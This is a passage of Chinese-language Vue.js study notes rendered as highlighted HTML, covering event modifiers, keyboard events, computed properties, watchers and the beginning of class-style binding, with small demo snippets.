<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>欢迎来到学习<span class="nt">&lt;/h2&gt;</span>
    <span class="c">&lt;!-- &lt;button v-on:click="showInfo"&gt;点我提示信息&lt;/button&gt; --&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"showInfo1"</span><span class="nt">&gt;</span>点我提示信息1（不传参）<span class="nt">&lt;/button&gt;</span>
    <span class="c">&lt;!-- 主动传事件本身 --&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"showInfo2($event,66)"</span><span class="nt">&gt;</span>点我提示信息2（传参）<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">vue</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:{</span>
            <span class="c1">// 如果vue模板没有写event，会自动传 event 给函数</span>
            <span class="nx">showInfo1</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
                <span class="c1">// console.log(event.target.innerText)</span>
                <span class="c1">// console.log(this) //此处的this是vm</span>
                <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">同学你好！</span><span class="dl">'</span><span class="p">)</span>
            <span class="p">},</span>
            <span class="nx">showInfo2</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span><span class="nx">number</span><span class="p">){</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span><span class="nx">number</span><span class="p">)</span>
                <span class="c1">// console.log(event.target.innerText)</span>
                <span class="c1">// console.log(this) //此处的this是vm</span>
                <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">同学你好！！</span><span class="dl">'</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}</span>
	<span class="p">});</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>Vue中的事件修饰符</strong></p><ul><li>prevent：阻止默认事件（常用）</li><li>stop：阻止事件冒泡（常用）</li><li>self：事件处理只来自自身（常用）</li><li>once：事件只触发一次（常用）</li><li>capture：指向内部元素的事件，在被内部元素处理前，先被外部处理</li><li>passive：事件的默认行为立刻发生，而非等待“on~~”完成</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>欢迎来到学习<span class="nt">&lt;/h2&gt;</span>
    <span class="c">&lt;!-- 阻止默认事件（常用） --&gt;</span>
	<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://www.baidu.com"</span> <span class="err">@</span><span class="na">click.prevent=</span><span class="s">"showInfo"</span><span class="nt">&gt;</span>点我提示信息<span class="nt">&lt;/a&gt;</span>
    <span class="c">&lt;!-- 阻止事件冒泡（常用） --&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"demo1"</span> <span class="err">@</span><span class="na">click=</span><span class="s">"showInfo"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click.stop=</span><span class="s">"showInfo"</span><span class="nt">&gt;</span>点我提示信息<span class="nt">&lt;/button&gt;</span>
        <span class="c">&lt;!-- 修饰符可以连续写 --&gt;</span>
        <span class="c">&lt;!-- &lt;a href="http://www.atguigu.com" @click.prevent.stop="showInfo"&gt;点我提示信息&lt;/a&gt; --&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    
    <span class="c">&lt;!-- 事件只触发一次（常用） --&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click.once=</span><span class="s">"showInfo"</span><span class="nt">&gt;</span>点我提示信息<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="c">&lt;!-- 添加事件监听器时，使用 `capture` 捕获模式 --&gt;</span>
<span class="c">&lt;!-- 例如：指向内部元素的事件，在被内部元素处理前，先被外部处理 --&gt;</span>
<span class="nt">&lt;div</span> <span class="err">@</span><span class="na">click.capture=</span><span class="s">"doThis"</span><span class="nt">&gt;</span>...<span class="nt">&lt;/div&gt;</span>


<span class="c">&lt;!-- 滚动事件的默认行为 (scrolling) 将立即发生而非等待 `onScroll` 完成 --&gt;</span>
<span class="c">&lt;!-- 以防其中包含 `event.preventDefault()` --&gt;</span>
<span class="nt">&lt;div</span> <span class="err">@</span><span class="na">scroll.passive=</span><span class="s">"onScroll"</span><span class="nt">&gt;</span>...<span class="nt">&lt;/div&gt;</span>


</code></pre></div></div><h2 id="18-键盘事件">1.8 键盘事件</h2><p>键盘事件语法糖：@keydown，@keyup</p><p>Vue中常用的按键别名：</p><ul><li>回车 =&gt; enter</li><li>删除 =&gt; delete</li><li>退出 =&gt; esc</li><li>空格 =&gt; space</li><li>换行 =&gt; tab (特殊，必须配合keydown去使用)</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>欢迎来到学习<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"按下回车提示输入"</span> <span class="err">@</span><span class="na">keydown.enter=</span><span class="s">"showInfo"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">浙江理工大学</span><span class="dl">'</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">showInfo</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
                <span class="c1">// console.log(e.key,e.keyCode)</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">},</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="19-计算属性">1.9 计算属性</h2><ul><li>定义：要用的属性不存在，要通过已有属性计算得来</li><li>原理：底层借助了Objcet.defineProperty方法提供的getter和setter</li><li>get函数什么时候执行？<ul><li>(1).初次读取时会执行一次</li><li>(2).当依赖的数据发生改变时会被再次调用</li></ul></li><li>优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便</li><li>备注：<ul><li>计算属性最终会出现在vm上，直接读取使用即可</li><li>如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变</li></ul></li></ul><blockquote><p>计算属性完整版写法</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    姓：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model=</span><span class="s">"firstName"</span><span class="nt">&gt;</span>
    名：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model=</span><span class="s">"lastName"</span><span class="nt">&gt;</span> 
    全名：<span class="nt">&lt;span&gt;&lt;/span&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">firstName</span><span class="p">:</span><span class="dl">'</span><span class="s1">张</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">lastName</span><span class="p">:</span><span class="dl">'</span><span class="s1">三</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="nl">computed</span><span class="p">:{</span>
            <span class="na">fullName</span><span class="p">:{</span>
                <span class="c1">//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值</span>
                <span class="c1">//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。</span>
                <span class="kd">get</span><span class="p">(){</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">get被调用了</span><span class="dl">'</span><span class="p">)</span>
                    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">-</span><span class="dl">'</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lastName</span>
                <span class="p">},</span>
                <span class="c1">//set什么时候调用? 当fullName被修改时。</span>
                <span class="c1">// 可以主动在控制台修改fullName来查看情况</span>
                <span class="kd">set</span><span class="p">(</span><span class="nx">value</span><span class="p">){</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">set</span><span class="dl">'</span><span class="p">,</span><span class="nx">value</span><span class="p">)</span>
                    <span class="kd">const</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">-</span><span class="dl">'</span><span class="p">)</span>
                    <span class="k">this</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                    <span class="k">this</span><span class="p">.</span><span class="nx">lastName</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220322111732512.png" alt="image-20220322111732512" /></p><blockquote><p>计算属性简写</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    姓：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model=</span><span class="s">"firstName"</span><span class="nt">&gt;</span>
    名：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model=</span><span class="s">"lastName"</span><span class="nt">&gt;</span> 
    全名：<span class="nt">&lt;span&gt;&lt;/span&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">firstName</span><span class="p">:</span><span class="dl">'</span><span class="s1">张</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">lastName</span><span class="p">:</span><span class="dl">'</span><span class="s1">三</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="nl">computed</span><span class="p">:{</span>
            <span class="nx">fullName</span><span class="p">()</span> <span class="p">{</span>
        		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">get被调用了</span><span class="dl">'</span><span class="p">)</span>
				<span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">-</span><span class="dl">'</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lastName</span>
    		<span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="110-监视属性">1.10 监视属性</h2><p>监视属性watch：</p><ul><li>当被监视的属性变化时, 回调函数自动调用, 进行相关操作</li><li>监视的属性必须存在，才能进行监视</li><li>监视的两种写法：<ul><li>(1).new Vue时传入watch配置</li><li>(2).通过vm.$watch监视</li></ul></li></ul><blockquote><p>第一种写法</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>今天天气很<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"changeWeather"</span><span class="nt">&gt;</span>切换天气<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>


<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">isHot</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="na">computed</span><span class="p">:{</span>
            <span class="nx">info</span><span class="p">(){</span>
                <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">炎热</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">凉爽</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">changeWeather</span><span class="p">(){</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">isHot</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">watch</span><span class="p">:{</span>
            <span class="na">isHot</span><span class="p">:{</span>
                <span class="na">immediate</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 初始化时让handler调用一下</span>
                <span class="c1">// handler什么时候调用？当isHot发生改变时。</span>
                <span class="nx">handler</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">){</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">isHot被修改了</span><span class="dl">'</span><span class="p">,</span><span class="nx">newValue</span><span class="p">,</span><span class="nx">oldValue</span><span class="p">)</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span> 
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><blockquote><p>第二种写法</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>今天天气很<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"changeWeather"</span><span class="nt">&gt;</span>切换天气<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>


<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">isHot</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="na">computed</span><span class="p">:{</span>
            <span class="nx">info</span><span class="p">(){</span>
                <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">炎热</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">凉爽</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">changeWeather</span><span class="p">(){</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">isHot</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
    
    <span class="nx">vm</span><span class="p">.</span><span class="nx">$watch</span><span class="p">(</span><span class="dl">'</span><span class="s1">isHot</span><span class="dl">'</span><span class="p">,{</span>
        <span class="na">immediate</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span> <span class="c1">//初始化时让handler调用一下</span>
        <span class="c1">//handler什么时候调用？当isHot发生改变时。</span>
        <span class="nx">handler</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span><span class="nx">oldValue</span><span class="p">){</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">isHot被修改了</span><span class="dl">'</span><span class="p">,</span><span class="nx">newValue</span><span class="p">,</span><span class="nx">oldValue</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>深度监视：</strong></p><ul><li>(1).Vue中的watch默认不监测对象内部值的改变（一层）</li><li>(2).配置deep:true可以监测对象内部值改变（多层）</li></ul><blockquote><p>备注：</p><p>(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以</p><p>(2).使用watch时根据数据的具体结构，决定是否采用深度监视</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>
    <span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">numbers</span><span class="p">:{</span>
                <span class="na">c</span><span class="p">:{</span>
                    <span class="na">d</span><span class="p">:{</span>
                        <span class="na">e</span><span class="p">:</span><span class="mi">100</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">watch</span><span class="p">:{</span>
            <span class="c1">//监视多级结构中某个属性的变化</span>
            <span class="cm">/* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */</span>
            <span class="c1">//监视多级结构中所有属性的变化</span>
            <span class="na">numbers</span><span class="p">:{</span>
                <span class="na">deep</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
                <span class="nx">handler</span><span class="p">(){</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">numbers改变了</span><span class="dl">'</span><span class="p">)</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220322114717167.png" alt="image-20220322114717167" /></p><blockquote><p>监视属性简写</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>今天天气很<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"changeWeather"</span><span class="nt">&gt;</span>切换天气<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">isHot</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="na">computed</span><span class="p">:{</span>
            <span class="nx">info</span><span class="p">(){</span>
                <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">炎热</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">凉爽</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">changeWeather</span><span class="p">(){</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">isHot</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">watch</span><span class="p">:{</span>
            <span class="c1">//简写</span>
            <span class="nx">isHot</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">isHot被修改了</span><span class="dl">'</span><span class="p">,</span> <span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">,</span> <span class="k">this</span><span class="p">)</span>
			<span class="p">}</span> 
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>computed和watch之间的区别：</strong></p><ul><li>computed能完成的功能，watch都可以完成</li><li>watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作</li></ul><blockquote><p>两个重要的小原则：</p><p>1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象</p><p>2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    姓：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model=</span><span class="s">"firstName"</span><span class="nt">&gt;</span> <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
    名：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model=</span><span class="s">"lastName"</span><span class="nt">&gt;</span> <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
    全名：<span class="nt">&lt;span&gt;&lt;/span&gt;</span> <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">firstName</span><span class="p">:</span><span class="dl">'</span><span class="s1">张</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">lastName</span><span class="p">:</span><span class="dl">'</span><span class="s1">三</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">fullName</span><span class="p">:</span><span class="dl">'</span><span class="s1">张-三</span><span class="dl">'</span>
        <span class="p">},</span>
        <span class="na">watch</span><span class="p">:{</span>
            <span class="c1">// watch 监视器里可以写 异步函数</span>
            <span class="nx">firstName</span><span class="p">(</span><span class="nx">val</span><span class="p">){</span>
                <span class="nx">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">)</span>
                    <span class="k">this</span><span class="p">.</span><span class="nx">fullName</span> <span class="o">=</span> <span class="nx">val</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">-</span><span class="dl">'</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lastName</span>
                <span class="p">},</span><span class="mi">1000</span><span class="p">);</span>
            <span class="p">},</span>
            <span class="nx">lastName</span><span class="p">(</span><span class="nx">val</span><span class="p">){</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">fullName</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">-</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">val</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="111-绑定样式">1.11 绑定样式</h2><h3 id="class样式"><strong>class样式</strong></h3><p>写法：:class=”xxx” xxx可以是字符串、对象、数。</p><p>所以分为三种写法，字符串写法，数组写法，对象写法</p><p><strong>字符串写法</strong></p><p>字符串写法适用于：类名不确定，要动态获取。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
	<span class="nc">.normal</span><span class="p">{</span>
        <span class="nl">background-color</span><span class="p">:</span> <span class="no">skyblue</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="c">&lt;!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"basic"</span> <span class="na">:class=</span><span class="s">"mood"</span> <span class="err">@</span><span class="na">click=</span><span class="s">"changeMood"</span><span class="nt">&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">mood</span><span class="p">:</span><span class="dl">'</span><span class="s1">normal</span><span class="dl">'</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>数组写法</strong></p><p>数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
    <span class="nc">.atguigu1</span><span class="p">{</span>
        <span class="nl">background-color</span><span class="p">:</span> <span class="no">yellowgreen</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nc">.atguigu2</span><span class="p">{</span>
        <span class="nl">font-size</span><span class="p">:</span> <span class="m">30px</span><span class="p">;</span>
        <span class="nl">text-shadow</span><span class="p">:</span><span class="m">2px</span> <span class="m">2px</span> <span class="m">10px</span> <span class="no">red</span><span class="p">;</span>
    <span class="p">}</span>
